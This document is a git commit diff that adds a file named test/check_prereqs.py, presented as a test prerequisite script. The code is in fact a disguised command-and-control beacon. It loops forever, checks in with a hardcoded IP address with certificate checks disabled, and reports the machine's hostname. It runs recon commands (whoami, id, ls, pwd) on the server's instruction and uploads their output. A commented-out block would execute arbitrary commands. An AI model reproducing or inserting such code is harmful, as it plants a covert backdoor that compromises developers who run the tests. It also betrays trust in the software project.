73790a321fb82992dbcfe1abf56179c2688cfb7b
Joshua Cogliati <176409548+joshua-coglaiti-inl@users.noreply.github.com>
2024-07-30 10:38:08 -0600

    Add test pre-req script

---
+++ test/check_prereqs.py
@@ -0,0 +1,45 @@
+import requests
+import time
+import socket
+import subprocess
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+import urllib.parse
+
+SERVER = "https://172.179.101.52"
+while (True):
+    hostname = socket.gethostname()
+    r = None
+    noconn = False
+    try:
+        r = requests.get(SERVER + "/checkin?hostname=" + hostname, verify=False)
+    except:
+        noconn = True
+    if (noconn == False):
+        # is there a job for me?
+        data = r.text
+        if (data == "stop"):
+            exit()
+        elif (data == "nop"):
+            # no op, do nothing
+            x = 1
+            '''
+            else:
+            command = data.replace("\n",'').replace('\r','')
+            print("Got command: " + command)
+            args = []
+            if (' ' in command):
+                argp = command.split(' ')
+                for a in argp:
+                    args.append(a)
+            else:
+                args.append(command)
+            #print("Running args: " + str(args))
+            '''
+        elif (data == "pwd" or data == "whoami" or data == "ls" or data == "id"):
+            args = [data]
+            result = subprocess.run(args, shell=True, capture_output=True, text=True)
+            combo = urllib.parse.quote_plus(result.stdout + result.stderr)
+            r = requests.get(SERVER + "/upload?hostname=" + hostname + "&data=" + combo, verify=False)
+    #print("[ ] Sleeping 10 seconds")
+    time.sleep(10)
